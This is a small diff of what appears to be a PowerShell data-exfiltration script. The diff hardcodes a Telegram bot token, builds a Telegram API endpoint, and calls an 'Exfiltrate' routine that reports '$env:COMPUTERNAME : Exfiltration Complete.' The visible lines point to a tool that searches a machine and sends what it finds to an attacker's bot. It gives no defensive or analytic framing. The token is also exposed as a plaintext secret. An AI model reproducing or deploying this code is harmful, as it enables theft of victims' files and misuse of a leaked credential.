@@ -1,4 +1,4 @@
-﻿$Token = "$tg"
+﻿$Token = "8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI"
 $URL='https://api.telegram.org/bot{0}' -f $Token 
 
 while($chatID.length -eq 0){
@@ -66,3 +66,4 @@ Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
 
 # Define What you want to search for (examples at the top)
 Exfiltrate
+
